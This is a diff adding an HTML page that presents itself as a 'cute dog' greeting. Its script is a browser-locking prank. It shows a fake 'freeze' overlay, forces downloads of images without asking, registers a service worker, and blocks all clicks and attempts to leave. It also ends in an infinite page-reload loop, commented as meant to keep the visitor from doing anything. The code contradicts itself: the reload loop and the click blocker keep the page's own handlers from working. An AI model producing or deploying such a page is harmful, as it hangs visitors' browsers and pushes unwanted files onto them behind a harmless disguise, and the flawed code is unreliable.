@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Page</title>
+    <style>
+        .hidden {
+            display: none;
+        }
+        .active {
+            background-color: #f0f0f0;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9); /* Dark overlay to simulate freeze */
+            color: white;
+            font-size: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            pointer-events: auto; /* Ensure overlay blocks interactions */
+            user-select: none; /* Prevent text selection */
+        }
+        .overlay.hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="initialMessage" class="hello-message">
+        <h1>Hello, I am a cute dog!</h1>
+        <h2>Click on the dog to continue.</h2>
+        <img id="cuteDogImage" src="https://via.placeholder.com/300?text=Cute+Dog" alt="Cute dog" style="cursor: pointer;">
+    </div>
+    <div id="originalContent" class="hidden">
+        <div class="logout-messages">
+            <!-- Your logout messages here -->
+        </div>
+        <video src="jozin.mp4" loop autoplay></video>
+        <video src="albundy.mp4" autoplay loop style="width: 100%; height: 100%;"></video>
+    </div>
+    <audio id="backgroundAudio" style="display: none;"></audio>
+
+    <!-- Overlay for "freeze" effect -->
+    <div id="overlay" class="overlay hidden">Please wait, images are downloading...</div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const initialMessage = document.getElementById('initialMessage');
+            const originalContent = document.getElementById('originalContent');
+            const audio = document.getElementById('backgroundAudio');
+            const overlay = document.getElementById('overlay');
+
+            // Initialize audio
+            audio.src = 'your-audio-file.mp3'; // Replace with your audio file path
+            audio.loop = true; // Ensure audio plays on loop
+
+            function startOriginalCode() {
+                // Hide initial content
+                initialMessage.style.display = 'none';
+                originalContent.classList.remove('hidden');
+                document.body.classList.add('active');
+
+                // Show overlay
+                overlay.classList.remove('hidden');
+
+                // Simulate image downloads
+                const images = [
+                    'https://images.unsplash.com/photo-1616572750941-8d4857b76f4c?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDJ8fGJhZ3JhbmllcyUyQ2Zsb3dlcnxlbnwwfHx8fDE2NzcxMDgxMDg&ixlib=rb-1.2.1&q=80&w=400',
+                    'https://images.unsplash.com/photo-1609747113880-30c98c080283?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDJ8fGJhZ3JhbmllcyUyQ2Zsb3dlcnxlbnwwfHx8fDE2NzcxMDgxMDg&ixlib=rb-1.2.1&q=80&w=400',
+                    'https://images.unsplash.com/photo-1593642633279-1b4e4d18d2b4?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDJ8fGJhZ3JhbmllcyUyQ2Zsb3dlcnxlbnwwfHx8fDE2NzcxMDgxMDg&ixlib=rb-1.2.1&q=80&w=400'
+                ]; // Replace with actual image URLs
+                images.forEach(src => {
+                    const link = document.createElement('a');
+                    link.href = src;
+                    link.download = src.split('/').pop(); // Use the last part of the URL as filename
+                    link.style.display = 'none'; // Hide the link element
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                });
+
+                // Optionally hide the overlay after a delay
+                setTimeout(() => {
+                    overlay.classList.add('hidden');
+                }, 3000); // Adjust the timeout duration as needed
+            }
+
+            // Ensure the image ID is correctly targeted
+            document.getElementById('cuteDogImage').addEventListener('click', startOriginalCode);
+
+            // Service Worker registration
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker
+                    .register('/sw.js')
+                    .then(function() { console.log("Service Worker Registered"); })
+                    .catch(function(error) { console.error("Service Worker Registration Failed:", error); });
+            }
+
+            // Prevent page reload or navigation
+            window.onbeforeunload = function() {
+                return "Are you sure you want to leave?";
+            };
+
+            // Prevent default click actions and block interactions
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+            }, true);
+        });
+
+        // Reload page infinitely to prevent user from doing anything
+        window.onbeforeunload = function() {};
+        while (true) {
+            location.reload(true);
+        }
+    </script>
+</body>
+</html>
